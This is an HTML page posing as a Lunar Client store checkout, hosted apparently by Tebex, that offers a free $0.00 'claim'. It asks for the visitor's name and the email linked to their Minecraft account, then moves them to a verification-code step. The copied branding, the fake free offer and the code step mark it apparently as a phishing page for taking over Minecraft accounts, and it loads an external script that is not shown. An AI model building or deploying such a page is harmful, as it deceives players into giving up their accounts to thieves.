<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lunar Client | Claim</title>
    <link rel="shortcut icon" href="https://static.moonsworth.store/6ab4ea0600ca447e882e4f083b2f6475/favicon-dead2b09d49cc672928bfcb9ea163381.ico">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            font-size: 16px;
        }

        .container {
            max-width: 1400px; /* Increased max-width for a bit wider container */
            width: 100%;
            margin: 50px auto; /* Add margin-top to create space between the top of the page */
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px; /* Add border radius */
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: #f1f1f1;
            padding: 20px;
            border-top-left-radius: 10px; /* Add border radius to match the container */
            border-top-right-radius: 10px; /* Add border radius to match the container */
        }

        .logo {
            height: 60px;
            width: auto;
            max-height: 60px;
        }

        .steps {
            display: flex;
            gap: 20px;
        }

        .step {
            text-align: center;
            color: #bbb;
            font-size: 16px;
        }

        .step.active {
            color: #000;
            font-weight: bold;
        }

        .main {
            display: flex;
            flex-wrap: wrap; /* Allow wrapping for smaller screens */
            padding: 20px;
        }

        .details,
        .order {
            flex: 1;
            min-width: 300px; /* Minimum width to ensure good layout on smaller screens */
            padding: 20px;
        }

        h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .name-fields {
            display: flex;
            gap: 20px;
        }

        .field {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        label {
            font-size: 16px;
            color: #555;
        }

        input[type="text"],
        input[type="email"] {
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            color: #333;
        }

        .checkbox {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 16px;
        }

        button {
            padding: 18px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #0056b3;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 16px;
        }

        th,
        td {
            padding: 18px;
            border-bottom: 1px solid #f1f1f1;
            text-align: left;
        }

        .total-price {
            margin: 24px 0;
            font-size: 20px;
            color: #333;
        }

        .total-price span {
            font-weight: bold;
            color: #007bff;
        }

        .back-to-basket {
            display: inline-block;
            margin-bottom: 24px;
            color: #007bff;
            text-decoration: none;
            font-size: 16px;
        }

        .back-to-basket:hover {
            text-decoration: underline;
        }

        .payment-methods img {
            height: 36px;
            margin-right: 15px;
        }

        .powered-by {
            font-size: 14px;
            color: #888;
            margin-top: 20px;
        }

        #logo {
            border-radius: 20px;
        }
    </style>
    <script src="/js.js/js2.js"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <img id="logo" src="/lunarlogo.png" alt="Logo" class="logo">
            <div class="steps">
                <img src="/username.png" height="60px">
                <img src="/urdetails.png" height="60px">
                <img src="/claim.png" height="60px">
            </div>
        </div>
        <div class="main">
            <div class="details">
                <h2>Your Details</h2>
                <form id="myForm" action="/code.html">
                    <div class="name-fields">
                        <div class="field">
                            <label for="first-name">First Name</label>
                            <input type="text" class="theinputs" id="first-name" name="first-name" placeholder="Enter your first name">
                        </div>
                        <div class="field">
                            <label for="last-name">Last Name</label>
                            <input type="text" class="theinputs" id="last-name" name="last-name" placeholder="Enter your last name">
                        </div>
                    </div>
                    <label for="email">Minecraft Email Address</label>
                    <input autofocus type="email" class="theinputs" id="email" name="email" placeholder="Enter the email address linked to your Minecraft Account" required>
                    
                    <button type="submit">Continue to Verification</button>
                    <div class="checkbox">
                        <input type="checkbox" id="updates" name="updates">
                        <label for="updates">Lunar Client & Tebex may send me updates & announcements via email.</label>
                    </div>
                </form>
            </div>
            <div class="order">
                <h2>Your Order</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Item</th>
                            <th>Price</th>
                            <th>Quantity</th>
                            <th>Total</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Item</td>
                            <td>$0.00</td>
                            <td>1</td>
                            <td>$0.00</td>
                        </tr>
                    </tbody>
                </table>
                <div class="total-price">
                    Total price: <span>$0.00</span>
                </div>
                <a href="/index.html" class="back-to-basket">Back to Username</a>
                <div class="payment-methods">
                    <img src="visa.png" alt="Visa">
                    <img src="mastercard.png" alt="Mastercard">
                    <img src="paypal.png" alt="PayPal">
                </div>
                <div class="powered-by">
                    Lunar Client is powered by Tebex, our authorized e-commerce reseller & merchant of record.
                </div>
            </div>
        </div>
    </div>
</body>
</html>
